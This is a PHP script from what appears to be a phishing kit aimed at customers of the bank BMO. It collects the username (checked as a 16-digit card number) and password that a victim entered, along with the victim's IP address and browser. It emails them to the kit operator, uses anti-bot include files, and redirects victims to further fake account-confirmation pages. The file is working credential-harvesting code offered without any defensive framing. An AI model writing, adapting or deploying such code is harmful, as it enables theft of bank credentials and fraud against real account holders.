<?php
session_start();
include 'email.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/anti9.php';


$ip = getenv("REMOTE_ADDR");


$cardno=$_SESSION['username'];

$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------- Login-Results--------------------\n";
$message .= "username : ".$_SESSION['username']."\n";
$message .= "password : ".$_SESSION['password']."\n";
$message .= "--------------------------------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "----------BMO Results------------------------\n";
$subject = "BMO  $ip".$_POST['results'];
$headers = "MIME-Version: 1.0\n";


if(strlen($cardno) == 16) {

mail($send,$subject,$message,$headers);
}
else{
	echo "<meta http-equiv='refresh' content='0;url=https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiN6qmLgvPmAhUqnuAKHTAUBOoQFjAAegQIFxAC&url=https%3A%2F%2Fbmo.com%2F&usg=AOvVaw2PqTCCgp4d2maHt-FsW94C'>";
}
if (preg_match("/^5007*/", $cardno)){
	echo "<meta http-equiv='refresh' content='0;url=basic.php'>";
	
}
else{
	echo "<meta http-equiv='refresh' content='0;url=accountConfirm.php'>";
}

?>

